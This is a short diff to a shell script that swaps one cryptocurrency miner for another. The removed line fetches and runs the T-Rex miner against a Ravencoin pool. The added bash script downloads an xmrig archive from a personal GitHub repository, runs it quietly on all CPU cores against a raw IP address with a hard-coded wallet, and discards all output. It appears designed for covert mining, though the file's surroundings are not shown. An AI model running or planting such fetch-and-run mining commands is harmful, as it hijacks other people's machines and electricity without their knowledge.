@@ -1,1 +1,6 @@
-wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz && tar -zxvf t-rex-0.26.8-linux.tar.gz && ./t-rex -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RJK4zn6E7EH8FCzrSos7vrJxB74qB2PX6u.yangbeb
+#!/bin/bash
+A=139.162.30.175:443
+B=SaLvsBkggaZbHsXJoYQnuhZeaQD8aKjXqP882vZmTBkneBdrZw9KH1BfkcaD16GEitJSDmteoTsYVH2CVXZz2NbuVuR8qhi4ueV
+C=HEHE
+wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
+./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
